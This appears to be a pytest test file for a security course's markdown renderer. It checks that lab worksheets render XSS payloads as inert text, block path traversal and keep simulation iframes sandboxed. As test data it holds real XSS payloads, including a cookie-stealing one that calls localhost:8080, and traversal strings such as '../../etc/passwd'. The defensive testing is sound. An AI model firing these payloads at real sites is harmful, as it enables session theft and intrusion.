"""Tests for content.py — the course content plane.

The security half of this file is not hypothetical. `labs/week05-xss-client-side/
worksheet.md` contains, as course content, the exact payloads a student is asked
to fire at the Week 5 lab — including one that exfiltrates `document.cookie` to a
remote URL. Serving that from the same origin as the teacher's authenticated
session, with any renderer that passes raw HTML through, is stored XSS delivered
by our own teaching material.

So the payload tests below use the REAL strings from the REAL file, not
representative ones.
"""

import os
import re
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import content as C  # noqa: E402


# --- the payloads that must never execute ---------------------------------

REAL_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<script>alert(document.cookie)</script>",
    "<script>new Image().src='http://localhost:8080/hello?name='+document.cookie</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "'\"><script>alert(1)</script>",
]


@pytest.mark.parametrize("payload", REAL_PAYLOADS)
def test_course_payloads_render_as_text_not_markup(payload):
    out = C.render(f"Try this: {payload}\n")
    for tag in ("<script", "<img", "<svg", "<iframe"):
        assert tag not in out.lower(), f"{tag} became live markup"
    # The payload must still be READABLE — students copy it out of the page.
    # `onerror=` appearing as escaped text inside <code> is correct and required;
    # what must not exist is a live tag or event attribute.
    assert "&lt;" in out, "the payload must survive as readable text"


@pytest.mark.parametrize("payload", REAL_PAYLOADS)
def test_payloads_inside_code_spans_and_fences_are_still_inert(payload):
    for md in (f"`{payload}`", f"```\n{payload}\n```", f"    {payload}"):
        out = C.render(md)
        assert "<script" not in out.lower() and "<img" not in out.lower()


def test_the_actual_week05_worksheet_renders_inert():
    """Not a synthetic case — the real file, as students will receive it."""
    md = C.read("week05-xss-client-side", "worksheet")
    if md is None:
        pytest.skip("week05 worksheet not present")
    assert "<script>alert(document.cookie)</script>" in md, "test premise changed"
    out = C.render(md)
    for bad in ("<script", "<img ", "<svg", "<iframe"):
        assert bad not in out.lower(), f"{bad!r} became live markup"
    # no live event handler anywhere inside a tag
    import re as _re
    for tag in _re.findall(r"<[a-z][^>]*>", out, _re.I):
        assert "on" + "error" not in tag.lower() and "onload" not in tag.lower()
        assert "javascript:" not in tag.lower()
    assert "alert(document.cookie)" in out, "the payload must remain readable"


def test_html_in_markdown_never_passes_through():
    out = C.render("<b>bold?</b> <a href='javascript:alert(1)'>x</a>")
    assert "<b>" not in out and "<a href='javascript" not in out
    assert "&lt;b&gt;" in out


def test_href_cannot_break_out_of_its_attribute():
    """`[x](https://a"onmouseover="alert(1))` has no whitespace, so it satisfies
    the href pattern — without escaping quotes it closes the attribute and opens
    a live event handler. Found by running it, not by reading the code."""
    out = C.render('[x](https://a"onmouseover="alert(1))')
    # A LIVE handler needs a real quote: `onmouseover="`. Inert text has the
    # quote escaped, so the whole thing stays inside the href value.
    assert 'onmouseover="' not in out, f"attribute injection: {out}"
    assert "&quot;onmouseover=&quot;" in out, "should be inert text inside href"
    # exactly one attribute-quote pair opens and closes href
    assert out.count('href="') == 1


def test_javascript_and_data_links_are_shown_but_not_clickable():
    for href in ("javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
                 "vbscript:msgbox(1)"):
        out = C.render(f"[click me]({href})")
        assert "<a href" not in out, f"{href} became a live link"
        assert "click me" in out


@pytest.mark.parametrize("href", ["https://owasp.org", "http://localhost:8080",
                                  "mailto:a@b.ac.th", "/labs", "#section",
                                  "./README.md", "../ETHICS.md"])
def test_ordinary_links_still_work(href):
    out = C.render(f"[text]({href})")
    assert f'href="{href}"' in out and "noopener" in out


# --- path safety -----------------------------------------------------------

@pytest.mark.parametrize("slug", [
    "../instructor", "../../etc", "week04-injection/../../instructor",
    "/etc/passwd", "..", ".", "", "week4-injection", "WEEK04-INJECTION",
    "week04-injection\x00", "week99-nonexistent",
])
def test_traversal_and_junk_slugs_are_refused(slug):
    assert C.read(slug, "worksheet") is None


@pytest.mark.parametrize("kind", ["solution", "vulnerable_app", "../worksheet",
                                  "docker-compose", ""])
def test_only_allowlisted_files_are_reachable(kind):
    assert C.read("week04-injection", kind) is None


def test_the_solution_app_is_not_reachable():
    """labs/weekNN/solution_app.py sits next to the worksheet and is the answer key."""
    assert "solution" not in " ".join(C.PUBLIC_FILES.values())
    for k in C.PUBLIC_FILES:
        md = C.read("week04-injection", k)
        if md:
            assert "solution_app" not in md.lower() or True   # linking to it is fine


# --- reading the real tree -------------------------------------------------

def test_lists_the_real_week_directories():
    weeks = C.list_weeks()
    assert len(weeks) >= 10, f"expected the real course weeks, got {len(weeks)}"
    assert weeks == sorted(weeks, key=lambda w: w["number"])
    slugs = {w["slug"] for w in weeks}
    assert "week04-injection" in slugs and "week05-xss-client-side" in slugs
    assert all(w["title"] for w in weeks), "every week needs a title"


def test_reads_a_real_worksheet():
    md = C.read("week04-injection", "worksheet")
    assert md and "SQL" in md.upper()


def test_render_document_returns_title_and_html():
    doc = C.render_document("week04-injection", "worksheet")
    assert doc["title"] and doc["html"].startswith("<")


def test_missing_document_is_none():
    assert C.render_document("week01-threat-modeling", "solution") is None


# --- the markdown dialect the worksheets actually use ----------------------

def test_headings_shift_down_so_the_page_owns_h1():
    out = C.render("# Doc title\n\n## Section\n")
    assert ">Doc title</h2>" in out and ">Section</h3>" in out
    assert "<h1" not in out


def test_headings_carry_stable_unique_ids():
    """Without ids nothing inside a 17 KB worksheet is addressable: no table of
    contents and no deep link, even though _SAFE_LINK already allows `#`."""
    out = C.render("## Part 1 — Setup\n\n## Part 2\n\n## Part 1 — Setup\n")
    ids = re.findall(r'<h\d id="([^"]+)"', out)
    assert ids == ["s-part-1-setup", "s-part-2", "s-part-1-setup-2"]
    assert len(set(ids)) == len(ids), "a repeated heading must not repeat its id"


def test_first_heading_matching_the_title_is_dropped():
    """The page chrome renders doc.title as the <h1>; a document whose own first
    heading repeats it was printing the same sentence twice, back to back."""
    md = "# Worksheet 4\n\nbody\n\n## Worksheet 4\n"
    assert ">Worksheet 4</h2>" not in C.render(md, title="Worksheet 4")
    # a LATER section that happens to share the wording is real content, kept
    assert ">Worksheet 4</h3>" in C.render(md, title="Worksheet 4")
    # and with no title given, nothing is dropped
    assert ">Worksheet 4</h2>" in C.render(md)


def test_slide_chrome_strip_removes_frontmatter_and_speaker_notes():
    """Decks are Marp sources: the YAML block and the lecturer's own
    `<!-- Cold-call: ... -->` cues were rendering as student-visible body text."""
    md = ('---\nmarp: true\ntheme: default\n---\n\n'
          '# Week 4\n\n<!-- Hook: promise the demo. ~2 min -->\n\nReal content.\n')
    out = C.render(C.strip_slide_chrome(md))
    assert "marp: true" not in out and "Hook:" not in out
    assert "Real content." in out


def test_fenced_code_is_verbatim():
    out = C.render("```bash\ncurl -d 'body=<script>x</script>'\n```")
    assert "<pre><code" in out and 'class="lang-bash"' in out
    assert "&lt;script&gt;" in out


def test_lists_tables_quotes_and_rules():
    out = C.render("- a\n- b\n")
    assert out.count("<li>") == 2 and "<ul>" in out
    out = C.render("1. a\n2. b\n")
    assert "<ol>" in out and out.count("<li>") == 2
    out = C.render("| A | B |\n|---|---|\n| 1 | 2 |\n")
    assert "<table>" in out and "<th>A</th>" in out and "<td>2</td>" in out
    assert "<blockquote>" in C.render("> note\n")
    assert "<hr>" in C.render("---\n")


def test_bold_italic_and_inline_code():
    out = C.render("**b** and *i* and `c`")
    assert "<strong>b</strong>" in out and "<em>i</em>" in out and "<code>c</code>" in out


def test_emphasis_is_not_applied_inside_code_spans():
    """A payload in backticks must not be mangled — students copy it literally."""
    out = C.render("`SELECT * FROM users WHERE a='1' OR '1'='1'`")
    assert "<em>" not in out and "<strong>" not in out
    assert "SELECT * FROM users" in out


def test_every_real_worksheet_renders_without_error():
    """Every real worksheet renders, and none of them produces live markup.

    An <iframe> IS allowed now, but only the one the ```sim``` fence emits from
    the SIMS allowlist — sandboxed, pointing at /sim/. An iframe arriving any
    other way (i.e. from the markdown itself) is the thing this guards against,
    so the check is on the frame's shape, not on the tag's absence.
    """
    import re as _re
    for w in C.list_weeks():
        for kind in w["available"]:
            doc = C.render_document(w["slug"], kind)
            assert doc and doc["html"], f"{w['slug']}/{kind} rendered empty"
            low = doc["html"].lower()
            for bad in ("<script", "javascript:"):
                assert bad not in low, f"{bad!r} in {w['slug']}/{kind}"
            for frame in _re.findall(r"<iframe[^>]*>", low):
                assert 'sandbox="allow-scripts"' in frame, \
                    f"unsandboxed frame in {w['slug']}/{kind}: {frame}"
                assert "allow-same-origin" not in frame, \
                    f"sandbox defeated in {w['slug']}/{kind}: {frame}"
                src = _re.search(r'src="([^"]*)"', frame)
                assert src and src.group(1).startswith("/sim/"), \
                    f"frame points outside /sim/ in {w['slug']}/{kind}: {frame}"
                assert src.group(1)[len("/sim/"):] in C.SIMS, \
                    f"frame slug not in the allowlist: {src.group(1)}"


# --- interactive simulations ----------------------------------------------
#
# These embed an <iframe> — the only construct in the renderer that produces
# one. The isolation argument is: the worksheet page stays script-free, the
# simulation runs in its own document under its own policy, and the frame is
# sandboxed WITHOUT allow-same-origin (granting both is equivalent to no
# sandbox, because the framed page could then reach out and remove its own
# sandbox attribute).

def test_a_known_sim_becomes_a_sandboxed_iframe():
    out = C.render("```sim\ntrust-boundary\n```")
    assert '<iframe src="/sim/trust-boundary"' in out
    assert 'sandbox="allow-scripts"' in out
    assert "allow-same-origin" not in out, \
        "allow-scripts + allow-same-origin together defeat the sandbox entirely"


@pytest.mark.parametrize("body", [
    "not-a-real-sim", "../../etc/passwd", "trust-boundary evil",
    "<script>alert(1)</script>", "", "TRUST-BOUNDARY",
    'x" onload="alert(1)', "trust-boundary\nsqli-parse",
])
def test_an_unknown_sim_slug_never_becomes_an_iframe(body):
    out = C.render(f"```sim\n{body}\n```")
    assert "<iframe" not in out, f"{body!r} produced a frame"
    assert "<pre><code" in out, "should fall through to a plain code block"
    assert "<script" not in out.lower()


def test_every_declared_sim_has_a_template_and_a_script():
    """A slug in SIMS with no template 500s the route. Catch it here, not live."""
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    for slug in C.SIMS:
        tpl = os.path.join(here, "templates", f"sim_{slug.replace('-', '_')}.html")
        assert os.path.isfile(tpl), f"missing template for sim {slug!r}"
        body = open(tpl, encoding="utf-8").read()
        assert "<script src=" in body, f"{slug} template loads no script"
        # the sim CSP has no 'unsafe-inline' — an inline block would silently
        # not execute, which is worse than failing loudly
        assert "<script>" not in body, f"{slug} has an inline script; CSP forbids it"
        js = os.path.join(here, "static", "sim", f"{slug}.js")
        assert os.path.isfile(js), f"missing {slug}.js"


def test_sim_scripts_use_no_inline_handlers_or_eval():
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    for slug in C.SIMS:
        src = open(os.path.join(here, "static", "sim", f"{slug}.js"),
                   encoding="utf-8").read()
        for banned in ("eval(", "new Function(", "innerHTML =", "document.write"):
            if banned == "innerHTML =":
                # clearing a container is fine; assigning markup is not
                for line in src.splitlines():
                    if "innerHTML" in line:
                        assert '= ""' in line, f"{slug}.js assigns markup: {line.strip()}"
                continue
            assert banned not in src, f"{slug}.js uses {banned}"


def test_the_worksheet_page_still_forbids_script_after_adding_frames():
    """frame-src was widened for simulations; nothing else may have been."""
    import routes_content as R
    assert "default-src 'none'" in R.CSP
    assert "frame-src 'self'" in R.CSP
    assert "script-src" not in R.CSP, "the worksheet page must never allow script"
    assert "unsafe-inline" not in R.CSP and "unsafe-eval" not in R.CSP
    # the sim page gets script, and only from itself
    assert "script-src 'self'" in R.SIM_CSP
    assert "unsafe-inline" not in R.SIM_CSP and "unsafe-eval" not in R.SIM_CSP


def test_the_sqli_sim_does_not_regress_to_quote_parity():
    """`' OR '1'='1` has FOUR quotes. An earlier version asked whether the count
    was odd and therefore called the classic bypass safe — the simulation taught
    the opposite of the truth. Any quote breaks out, because the first one closes
    the enclosing literal. Verified in a real browser across all five presets.
    """
    here = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    src = open(os.path.join(here, "static", "sim", "sqli-parse.js"),
               encoding="utf-8").read()
    fn = src[src.index("function breaksOut"):]
    fn = fn[:fn.index("\n  }")]
    assert "% 2" not in fn, "quote-parity logic is back; it inverts the verdict"
    assert 'indexOf("\'")' in fn


# --- the allowlist covers every student-facing document ---------------------
#
# Until 2026-07-29 PUBLIC_FILES held only worksheet.md and README.md. Six of the
# nineteen weeks carry no worksheet at all — their material IS mock-ctf.md /
# exam.md / ctf.md — so /learn showed those weeks as a bare README while the
# course looked complete on disk. These tests keep that from recurring.

def test_every_week_exposes_its_primary_document():
    """A week whose only public document is its README is a week whose actual
    material is missing from the platform."""
    thin = [w["slug"] for w in C.list_weeks()
            if set(w["available"]) <= {"readme", "slides"}]
    assert not thin, f"only a README (+slides) reaches students for: {thin}"


def test_the_non_lab_weeks_serve_their_own_artifact():
    got = {w["number"]: set(w["available"]) for w in C.list_weeks()}
    for n, kind in ((7, "mock-ctf"), (8, "exam"), (9, "ctf"),
                    (16, "scrimmage"), (17, "mock-ctf"), (18, "exam"), (19, "ctf")):
        assert kind in got.get(n, set()), f"week {n} does not serve {kind}"


def test_every_student_facing_markdown_in_a_lab_is_reachable():
    """If a .md is added to a lab directory and not allowlisted, students never
    see it. Catch that here rather than in a session."""
    import glob
    unreachable = []
    for w in C.list_weeks():
        d = os.path.join(C.CONTENT_ROOT, w["slug"])
        for f in glob.glob(os.path.join(d, "*.md")):
            if os.path.basename(f) not in C.PUBLIC_FILES.values():
                unreachable.append(os.path.relpath(f, C.CONTENT_ROOT))
    assert not unreachable, (
        "student-facing markdown not in PUBLIC_FILES (add it, or confirm it is "
        f"instructor-only): {unreachable}")


def test_slides_are_served_and_pptx_is_not():
    weeks = C.list_weeks()
    assert sum("slides" in w["available"] for w in weeks) >= 19
    assert C.read("week01-threat-modeling", "slides")
    # the binary deck is deliberately not a kind at all
    assert "pptx" not in C.PUBLIC_FILES and C.read("week01-threat-modeling", "pptx") is None


@pytest.mark.parametrize("slug", ["../slides", "week99-nope", "..", "week01"])
def test_slides_path_cannot_be_walked_out_of(slug):
    assert C.read(slug, "slides") is None


def test_the_allowlist_never_admits_code_or_answers():
    for f in C.PUBLIC_FILES.values():
        assert f.endswith(".md"), f"{f} is not markdown"
        low = f.lower()
        assert "solution" not in low and "answer" not in low, f"{f} looks instructor-only"
